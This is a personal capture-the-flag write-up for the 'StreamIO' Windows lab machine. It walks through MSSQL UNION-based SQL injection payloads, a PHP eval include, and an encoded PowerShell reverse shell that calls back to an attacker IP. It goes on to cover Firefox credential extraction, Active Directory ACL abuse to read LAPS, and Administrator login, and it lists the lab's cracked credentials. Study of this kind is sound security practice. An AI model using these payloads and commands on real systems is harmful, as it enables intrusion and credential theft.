# StreamIO \[Windows Medium]

## Report

A vhost 'http://watch.streamio.htb' has an endpoint 'search' which is vulnerable to SQLi. Retrieve a list of usernames and passwords, none of them are valid for SMB or Winrm. However, user 'yoshihide' is validated in the 'admin' login on the main HTTPS website.

This user has access to a debug option which looks like it can view the app source, using PHP wrappers view contents of master and index.php where a hidden input field 'include' exists which performs eval if value is not 'index.php'. Get a PHP windows reverse shell and access it using curl.

The Windows system has MSSQL installed, query it to find creds for user 'nikk37'.

This user has firefox creds saved according to winPEAS, crack it using the .db4 file and login.json

JDGodd associated password didn't work but making combinations of all usernames and passwords it did - this user can read LAPS password according to bloodhound. Read it to become Admin.

## Cheatsheet

```
nxc smb 10.10.11.158 -u 'user' -p '' --shares
smbclient -N -L //10.10.11.158
rpcclient -U '' -N 10.10.11.158
ldapsearch -H ldap://10.10.11.158 -x -s base namingcontexts
ldapsearch -H ldap://10.10.11.158 -x -b "DC=streamIO,DC=htb"
ldapsearch -H ldap://10.10.11.158 -x -b "DC=streamIO,DC=htb" '(objectClass=Person)'

https://streamio.htb/admin/ - custom forbidden page
./kerbrute_linux_amd64 userenum -d streamIO.htb  ~/htb/rooms/streamio/userlist.txt --dc streamIO.htb -v
None of the users - barry, oliver and samantha show as valid users on kerbrute

wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "https://streamio.htb/FUZZ"  --hc 404
ffuf -u https://streamio.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt

Auth bypass also dont work
search.php
Find number of columns first for UNION stmt, NOTE: the correct number (6) also dont show nothing
man' UNION select 1,@@version,3,4,5,6;-- -
man' UNION select 1,name,3,4,5,6 from master.sys.databases ;-- -
man' UNION select 1,name,3,4,5,6 from streamio_backup..sysobjects ;-- -
man' UNION select 1,name,3,4,5,6 from streamio..sysobjects ;-- -
man' UNION select 1,name,3,4,5,6 from syscolumns where id = (select id from sysobjects where name = 'users') ;-- -
man' UNION select 1,username,3,4,5,6 from users;-- -
select db_name()
#TIP concat because no guarantee the order of two separate queries may be the same
man' UNION select 1,concat(username,':',password),3,4,5,6 from users;-- -
id
is_staff
username
password

#TIP List identified endpoints on each website - you might come back to it in a bit
watch.streamio.htb - blocked.php, search.php
streamio.htb - admin

ffuf -w /usr/share/wordlists/dirb/common.txt -u https://streamio.htb/admin/?FUZZ= -b 'PHPSESSID=9b663mju62v6c7d2f1fif9bt5n' -fs 1678

#TIP FUZZ the admin directory once you gained priveleges, enumerate again
ffuf -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -u https://streamio.htb/admin/FUZZ -b 'PHPSESSID=9b663mju62v6c7d2f1fif9bt5n' 

<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>

system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=');

C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn> .\SQLCMD.EXE -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"

C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn> .\SQLCMD.EXE -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"

C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download key4.db
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download logins.json
python3 firepwd.py -d ..
nxc smb 10.10.11.158 -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' 

$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "streamio\JDgodd"
net user JDgodd
python3 ./timelapse/pyLAPS/pyLAPS.py --action get -d "streamio.htb" -u "JDgodd" -p "JDg0dd1s@d0p3cr3@t0r"
evil-winrm -i streamio.htb -u Administrator -p '%+2y(,L/+5ZXkZ'
```

## Loot

### Creds

```
yoshihide:66boysandgirls..
nikk37:get_dem_girls2@yahoo.com
JDgodd:JDg0dd1s@d0p3cr3@t0r
Administrator:%+2y(,L/+5ZXkZ
```

### Proof

```
How would you do dns?
Services Targeted: smb, rpc, ldap, https

commonName=streamIO
Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
443 (HTTPS) ssl-date: 2025-06-24T12:24:22+00:00; +7h00m49s from scanner time
```

## Rant

```
I SKIPPED OUT ON
NOT hydra for smb and web login after getting all those creds (I replaced all '3' with '' and messed up all the hashes i copied)
NOT looking for source of index.php as well (I only did for master where input hidden field was exposed, this had the db creds to perform further enumeration to the streamio_backup db that we couldnt access to THAT I TRIED DURING INFO DUMP BUT FORGOT LATER)

I Forgot About
the vhost watch.streamio.htb
the forbidden admin directory after gaining creds to fuzz this recursively

I Needed Help For
Powershell reverse shell
The very first query to kick off the SQLi enumeration
The PHP wrapper part i kinda forgot
I couldnt just enter any random password, I had to make an existing use the owner of the group

Next Time
Always keep a record of all website fuzz results, new users - new perms
```
